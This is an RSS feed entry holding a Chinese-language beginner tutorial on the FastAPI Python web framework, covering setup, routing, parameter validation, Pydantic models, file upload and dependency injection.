<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[FastAPI入门实战]]></title>    <link>https://juejin.cn/post/7579887768228085794</link>    <guid>https://juejin.cn/post/7579887768228085794</guid>    <pubDate>2025-12-05T05:09:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579887768228085794" data-draft-id="7579892134817234979" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="FastAPI入门实战"/> <meta itemprop="keywords" content="Python,前端,后端"/> <meta itemprop="datePublished" content="2025-12-05T05:09:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="只与明月听"/> <meta itemprop="url" content="https://juejin.cn/user/386661153249102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            FastAPI入门实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/386661153249102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    只与明月听
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T05:09:51.000Z" title="Fri Dec 05 2025 05:09:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h5 data-id="heading-0">一、前言</h5>
<p>准备朝着ai应用开发学习下，python完善的生态就注定必须学习的，相关的web框架有很多， Flask 与 Django 一直是最常见的选择，Django 功能完善、内置 ORM 和管理后台，适合快速构建大型、结构化的项目；Flask 则以极简著称，灵活自由，但需要开发者自行选择和组合扩展。随着项目对性能与类型安全要求的提高，一种更“现代化”的框架需求开始凸显。</p>
<p>FastAPI 正是在这样的背景下受到关注。它基于 Python 类型提示构建，自动生成清晰的 API 文档；内置高性能异步特性，速度可媲美 Node.js 和 Go；搭配 Pydantic 做数据校验，让开发、调试、联调都更高效。相比 Flask 的轻量但需要自己拼装生态、Django 的重量级但偏传统，FastAPI 更适合构建现代、快速迭代的 API 服务。</p>
<h5 data-id="heading-1">二、环境准备</h5>
<p>python常见的开发方式就是通过venv创建一个虚拟环境，这个虚拟环境就是一个独立的mini-python系统，包含一个独立的python解释器，独立的pip和独立的site-package，这样我们可以再不通的项目中使用不通的python版本。和node_modules不一样的是，python env隔离的是整个python环境，而node_modules隔离的只是依赖文件。</p>
<p>接下来就通过venv来创建虚拟环境，前提是已经安装好了python版本，不建议安装最新的，之前<code>llama_index</code>的例子，就出现过不兼容的现象，3.11即可。</p>
<p>首先激活虚拟环境</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建虚拟环境（venv 是目录名，可自行修改）</span>
python3 -m venv venv
​
<span class="hljs-comment"># 2. 激活虚拟环境</span>
<span class="hljs-comment"># Windows</span>
venv\Scripts\activate
</code></pre>
<p>然后安装框架和服务器</p>
<pre><code class="hljs language-css" lang="css">pip install fastapi uvicorn<span class="hljs-selector-attr">[standard]</span>
</code></pre>
<p>其中fastapi就是这个博客要学习的东西，<code>uvicorn</code> 是一款轻量级、超高性能的 <strong>ASGI 服务器（Asynchronous Server Gateway Interface）</strong> 。</p>
<p>FastAPI 基于 ASGI 协议构建，因此需要一个 ASGI 服务器来运行它。</p>
<h5 data-id="heading-2">三、FastAPI最小实例</h5>
<p>接下来就开始代码实操</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI
​
app = FastAPI(
    title=<span class="hljs-string">"Hello World API"</span>,
    description=<span class="hljs-string">"Basic demo of FastAPI: app instance, path operation, automatic docs."</span>,
    version=<span class="hljs-string">"0.1.0"</span>,
)
​
​
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/"</span>, summary=<span class="hljs-string">"Root Hello"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_root</span>():
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"Hello World"</span>}
​
​
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/hello/{name}"</span>, summary=<span class="hljs-string">"Personalized Hello"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_hello</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">f"Hello <span class="hljs-subst">{name}</span>"</span>}
​
​
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/health"</span>, summary=<span class="hljs-string">"Health Check"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">health</span>():
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"status"</span>: <span class="hljs-string">"ok"</span>}
​
</code></pre>
<p>代码也是比较简单的， <code>FastAPI</code> 是一个为API 提供了所有功能的 Python 类，变量 <code>app</code> 会是 <code>FastAPI</code> 类的一个实例，这个实例将是创建所有 API 的主要交互对象。</p>
<p>运行命令</p>
<pre><code class="hljs language-css" lang="css">uvicorn <span class="hljs-selector-tag">main</span>:app --reload --host <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> --port <span class="hljs-number">8000</span>
</code></pre>
<ul>
<li>基础根路径: <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">http://localhost:8000/</a></li>
<li>个性问候: <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">http://localhost:8000/hello/张三</a></li>
<li>健康检查: <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">http://localhost:8000/health</a></li>
<li>自动文档 (Swagger UI): <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">http://localhost:8000/docs</a></li>
<li>ReDoc: <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">http://localhost:8000/redoc</a></li>
</ul>
<h5 data-id="heading-3">四、路径操作</h5>
<p>在 FastAPI 中，所谓“路径操作”指的就是我们常说的 API 接口（如 GET、POST 等）。每个路径操作由一个 URL 路径和一个 HTTP 方法组成。FastAPI 为每一种方法都提供了对应的装饰器，使用非常直观。</p>
<p>FastAPI 支持常见的 RESTful 风格接口，示例：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/items"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_items</span>():
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"GET 请求"</span>}
​
<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">"/items"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: <span class="hljs-built_in">dict</span></span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"POST 请求"</span>, <span class="hljs-string">"item"</span>: item}
​
<span class="hljs-meta">@app.put(<span class="hljs-params"><span class="hljs-string">"/items/{item_id}"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">update_item</span>(<span class="hljs-params">item_id: <span class="hljs-built_in">int</span>, item: <span class="hljs-built_in">dict</span></span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"PUT 请求"</span>, <span class="hljs-string">"id"</span>: item_id, <span class="hljs-string">"item"</span>: item}
​
<span class="hljs-meta">@app.delete(<span class="hljs-params"><span class="hljs-string">"/items/{item_id}"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_item</span>(<span class="hljs-params">item_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"DELETE 请求"</span>, <span class="hljs-string">"id"</span>: item_id}
</code></pre>
<ol start="0">
<li>
<h6 data-id="heading-4">路径参数</h6>
<p>路径参数指 URL 中的一部分，例如 <code>/users/123</code> 中的 <code>123</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/users/{user_id}"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_user</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"user_id"</span>: user_id}
</code></pre>
<p>FastAPI 会根据类型自动校验：访问 <code>/users/abc</code> 会报 422 错误。</p>
<p>还可以添加约束，例如：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Path
​
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/orders/{order_id}"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_order</span>(<span class="hljs-params">order_id: <span class="hljs-built_in">int</span> = Path(<span class="hljs-params">gt=<span class="hljs-number">0</span>, description=<span class="hljs-string">"订单 ID 必须大于 0"</span></span>)</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"order_id"</span>: order_id}
</code></pre>
</li>
<li>
<h6 data-id="heading-5">查询参数</h6>
<p>查询参数是 <code>?key=value</code> 的部分，例如：<code>/search?q=fastapi&amp;page=1</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/search"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">q: <span class="hljs-built_in">str</span>, page: <span class="hljs-built_in">int</span> = <span class="hljs-number">1</span></span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"q"</span>: q, <span class="hljs-string">"page"</span>: page}
</code></pre>
<p>可以添加校验：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Query
​
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/products"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_products</span>(<span class="hljs-params">limit: <span class="hljs-built_in">int</span> = Query(<span class="hljs-params"><span class="hljs-number">10</span>, le=<span class="hljs-number">100</span></span>), keyword: <span class="hljs-built_in">str</span> = Query(<span class="hljs-params"><span class="hljs-literal">None</span>, min_length=<span class="hljs-number">2</span></span>)</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"limit"</span>: limit, <span class="hljs-string">"keyword"</span>: keyword}
</code></pre>
</li>
<li>
<h6 data-id="heading-6">参数校验</h6>
<p>FastAPI 的校验通过 <code>Query()</code>、<code>Path()</code> 等完成，常用校验包括：</p>
<ul>
<li><strong>最小值/最大值</strong>：<code>ge</code>（&gt;=）、<code>le</code>（&lt;=）、<code>gt</code>（&gt;）、<code>lt</code>（&lt;）</li>
<li><strong>字符串长度</strong>：<code>min_length</code> / <code>max_length</code></li>
<li><strong>正则校验</strong>：<code>regex</code></li>
</ul>
<p>示例：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/validate"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params">
    username: <span class="hljs-built_in">str</span> = Query(<span class="hljs-params">..., min_length=<span class="hljs-number">3</span>, max_length=<span class="hljs-number">20</span>, regex=<span class="hljs-string">"^[a-zA-Z0-9_]+$"</span></span>),
    age: <span class="hljs-built_in">int</span> = Query(<span class="hljs-params">..., ge=<span class="hljs-number">1</span>, le=<span class="hljs-number">120</span></span>)
</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"username"</span>: username, <span class="hljs-string">"age"</span>: age}
</code></pre>
</li>
</ol>
<h5 data-id="heading-7">五、使用Pydantic模型</h5>
<p>FastAPI 在数据校验和数据转换方面非常强大，这要归功于 <strong>Pydantic</strong>。在接收 JSON 请求体时，我们可以通过 Pydantic 模型来定义结构、类型、默认值以及校验规则，让 API 更健壮、更易维护。</p>
<ol start="0">
<li>
<h6 data-id="heading-8">定义请求模型</h6>
<p>一个典型的请求体（Request Body）使用 Pydantic 的 <code>BaseModel</code> 来定义字段和类型：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel
​
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Item</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    name: <span class="hljs-built_in">str</span>
    description: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
    price: <span class="hljs-built_in">float</span>
    in_stock: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">True</span>
</code></pre>
<p>FastAPI 会根据这些类型自动验证请求体，并在 Swagger 文档中展示字段结构。</p>
</li>
<li>
<h6 data-id="heading-9">使用模型</h6>
<p>直接将模型作为参数即可：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI
​
app = FastAPI()
​
<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">"/items"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_item</span>(<span class="hljs-params">item: Item</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"商品已创建"</span>, <span class="hljs-string">"item"</span>: item}
</code></pre>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"iPhone 16"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"最新型号"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"price"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">6999.99</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"in_stock"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
<span class="hljs-punctuation">}</span>
​
</code></pre>
<p>FastAPI 会自动把它转换为 <code>Item</code> 实例。如果字段缺失、类型不匹配，会返回 422 错误。</p>
</li>
<li>
<h6 data-id="heading-10">字段校验</h6>
<p>这里需要使用Pydantic 的 <code>Field()</code> ，来添加更精确的校验规则和描述</p>
<pre><code class="hljs language-arduino" lang="arduino">from pydantic <span class="hljs-keyword">import</span> BaseModel, Field
​
<span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(BaseModel)</span>:
    username: str =</span> <span class="hljs-built_in">Field</span>(..., min_length=<span class="hljs-number">3</span>, max_length=<span class="hljs-number">20</span>, description=<span class="hljs-string">"用户名必须为 3~20 个字符"</span>)
    age: <span class="hljs-type">int</span> = <span class="hljs-built_in">Field</span>(..., ge=<span class="hljs-number">1</span>, le=<span class="hljs-number">120</span>, description=<span class="hljs-string">"年龄必须在 1~120 之间"</span>)
</code></pre>
<p>这里就在<code>Field</code>中定义了<code>username</code>和<code>age</code>两个字段，<code>...</code>表明是必传字段，其中<code>username</code>的长度要在3-20之间，<code>age</code>要在1-120之间</p>
</li>
<li>
<h6 data-id="heading-11">嵌套模型</h6>
<p>当遇到一些复杂的模型时，就需要用到嵌套了</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    city: <span class="hljs-built_in">str</span>
    street: <span class="hljs-built_in">str</span>
​
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Customer</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    name: <span class="hljs-built_in">str</span>
    address: Address
</code></pre>
<p>对应的请求体就需要这样写了</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Tom"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"address"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"city"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Shanghai"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"street"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Nanjing Road"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
<li>
<h6 data-id="heading-12">相应模型</h6>
<p>上面的是入参的限制，同样也可以限制响应值的类型</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserPublic</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    username: <span class="hljs-built_in">str</span>
​
<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">"/users"</span>, response_model=UserPublic</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_user</span>(<span class="hljs-params">user: User</span>):
    <span class="hljs-comment"># 假装保存数据库...</span>
    <span class="hljs-keyword">return</span> user
</code></pre>
</li>
</ol>
<h5 data-id="heading-13">六、高级请求参数和路由模块化</h5>
<p>除了常见的get、post这种<code>JSON</code>请求体，还会处理表单、Cookies、Headers等输入</p>
<ol start="0">
<li>
<h6 data-id="heading-14">表单请求</h6>
<p>就是前端常见的form表单来提交数据</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Form
​
<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">"/login"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">username: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">...</span>), password: <span class="hljs-built_in">str</span> = Form(<span class="hljs-params">...</span>)</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"username"</span>: username}
</code></pre>
</li>
<li>
<h6 data-id="heading-15">文件上传</h6>
<p>文件上传也是一个很常见的功能</p>
<pre><code class="hljs language-ini" lang="ini">async function upload() {
    const <span class="hljs-attr">fileInput</span> = document.getElementById(<span class="hljs-string">"fileInput"</span>)<span class="hljs-comment">;</span>
    const <span class="hljs-attr">file</span> = fileInput.files[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span>
​
    const <span class="hljs-attr">formData</span> = new FormData()<span class="hljs-comment">;</span>
    formData.append("file", file)<span class="hljs-comment">;</span>
​
    const <span class="hljs-attr">res</span> = await fetch(<span class="hljs-string">"http://127.0.0.1:8000/upload"</span>, {
        method: "POST",
        body: formData
    })<span class="hljs-comment">;</span>
​
    const <span class="hljs-attr">data</span> = await res.json()<span class="hljs-comment">;</span>
    console.log("上传结果:", data)<span class="hljs-comment">;</span>
 }
</code></pre>
<p>对应的后端</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> File, UploadFile
​
<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">"/upload"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">file: UploadFile = File(<span class="hljs-params">...</span>)</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"filename"</span>: file.filename}
</code></pre>
</li>
<li>
<h6 data-id="heading-16">Cookies和headers</h6>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Cookie
​
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/read-cookie"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read_cookie</span>(<span class="hljs-params">session_id: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = Cookie(<span class="hljs-params"><span class="hljs-literal">None</span></span>)</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"session_id"</span>: session_id}
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Header
​
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/agent"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_agent</span>(<span class="hljs-params">user_agent: <span class="hljs-built_in">str</span> = Header(<span class="hljs-params">...</span>)</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"User-Agent"</span>: user_agent}
</code></pre>
</li>
</ol>

<ol start="4">
<li>
<h6 data-id="heading-17">路由模块化</h6>
<p>随着项目的变大，所有的路由都写在<code>main.py</code>中就会变得很难维护，可以使用<code>APIRouter</code>将路由拆分成多个模块</p>
<p>定义子路由</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter
​
router = APIRouter()
​
<span class="hljs-meta">@router.get(<span class="hljs-params"><span class="hljs-string">"/users"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():
    <span class="hljs-keyword">return</span> [{<span class="hljs-string">"name"</span>: <span class="hljs-string">"tom"</span>}]
​
</code></pre>
<p>在<code>main.py</code>中使用</p>
<pre><code class="hljs language-ini" lang="ini">from fastapi import FastAPI
from routers import user_router
​
<span class="hljs-attr">app</span> = FastAPI()
app.include_router(user_router, <span class="hljs-attr">prefix</span>=<span class="hljs-string">"/api"</span>, tags=[<span class="hljs-string">"Users"</span>])
</code></pre>
<p>这里的<code>prefix</code>就是给所有的路由加前缀，<code>tags</code>就是给文档分组显示</p>
</li>
</ol>
<h5 data-id="heading-18">七、依赖注入</h5>
<p>FastAPI 的依赖注入（Dependency Injection, DI）是其最强大的特性之一，主要用来处理权限、数据库连接、配置加载、复用逻辑 。</p>
<p>举一个例子就知道具体的用法了</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db</span>():
    db = DBSession()
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> db
    <span class="hljs-keyword">finally</span>:
        db.close()
​
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_current_user</span>(<span class="hljs-params">db = Depends(<span class="hljs-params">get_db</span>)</span>):
    token = ...  <span class="hljs-comment"># 从请求头拿 token</span>
    user = db.query(User).<span class="hljs-built_in">filter</span>(...).first()
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:
        <span class="hljs-keyword">raise</span> HTTPException(<span class="hljs-number">401</span>)
    <span class="hljs-keyword">return</span> user
​
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/profile"</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>(<span class="hljs-params">user = Depends(<span class="hljs-params">get_current_user</span>)</span>):
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"username"</span>: user.name}
</code></pre>
<p>这里定义了两个，get_db是获取数据库实例，get_current_user是获取当前用户的，在get_current_user方法中通过Depends() 将 get_db方法注入到db参数，这样在get_current_user方法内部就可以直接使用db来做数据路的查询了。</p>
<p>这里将get_current_user方法的执行流程描述下，就可以更加清晰的知道依赖注入的用法了</p>
<ol>
<li>在调用get_current_user方法时，看到db = Depends(get_db)</li>
<li>开始调用get_db方法获取实例，复制给db</li>
<li>执行get_db内部方法，db = DBSession()，遇到yield db，就将yield值传递给db = Depends(get_db)的db</li>
<li>方法执行完成后，会执行finally中的方法关闭连接</li>
</ol>
<p>后续在请求<code>"/profile"</code>中，也是一样的流程，值得一提的是，依赖注入不管请求调用多少次，同一个请求中的依赖注入只会调用一次，这样也是为了避免连接数据库的庞大开销。</p>
